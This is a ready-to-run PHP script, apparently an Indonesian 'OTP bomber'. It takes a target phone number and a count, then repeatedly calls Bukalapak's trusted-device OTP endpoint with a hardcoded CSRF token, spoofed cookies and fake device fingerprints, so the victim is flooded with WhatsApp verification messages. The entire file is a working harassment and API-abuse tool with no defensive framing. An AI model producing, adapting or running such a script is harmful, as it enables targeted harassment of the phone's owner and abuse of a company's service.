<?php
echo "COPYRIGHT : SGB TEAM\n\n";

// Input Nomor Target
echo "Nomor Target?\nInput : ";
$nomer = trim(fgets(STDIN));

// Validasi nomor
if (empty($nomer) || !is_numeric($nomer)) {
    exit("Nomor tidak valid!\n");
}

// Format nomor
if (substr($nomer, 0, 1) === "0") {
    // Ubah 0xxxxx -> 62xxxxx
    $nomer = "62" . substr($nomer, 1);
} elseif (substr($nomer, 0, 2) !== "62") {
    exit("Nomor harus diawali 0 atau 62!\n");
}

echo "Target: $nomer (y/n) ";
$cek = trim(fgets(STDIN));
if (strtolower($cek) === "n") exit("Stopped!\n");

// Input jumlah
echo "Jumlah?\nInput : ";
$jumlah = trim(fgets(STDIN));
if (!is_numeric($jumlah) || $jumlah <= 0) {
    exit("Jumlah tidak valid!\n");
}

// Eksekusi pengiriman
for ($a = 0; $a < $jumlah; $a++) {
    $rand1 = md5(rand(12345678, 98765432));
    $rand2 = md5(rand(12345678, 98765432));
    $rand = array($rand1, $rand2);

    // Ambil index acak yang valid
    $rand3 = md5($rand[array_rand($rand)]);

    $config['headers'] = explode("\n", "Host: m.bukalapak.com
Connection: keep-alive
Content-Length: 134
Origin: https://m.bukalapak.com
X-CSRF-Token: uYUfi93g92mZboBVB4UMwYInorBNOgyYEAbPUTikHht+xseF8BFUgg9qSgQWA9MRy7eL8G/SnbYUGg0JRM1fjw==
User-Agent: Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: */*
X-Requested-With: XMLHttpRequest
Save-Data: on
Referer: https://m.bukalapak.com/register?from=home_mobile
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,id;q=0.8
Cookie: identity=".$rand1."; browser_id=".$rand2.";");

    $ar = http_build_query(array(
        'feature' => 'phone_registration',
        'feature_tag' => '',
        'manual_phone' => $nomer,
        'device_fingerprint' => $rand3,
        'channel' => 'WhatsApp'
    ));

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://m.bukalapak.com/trusted_devices/otp_request");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $config['headers']);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $ar);

    $asw = curl_exec($ch);
    curl_close($ch);

    echo "[" . ($a + 1) . "] Target: $nomer [Sending]\n";
}
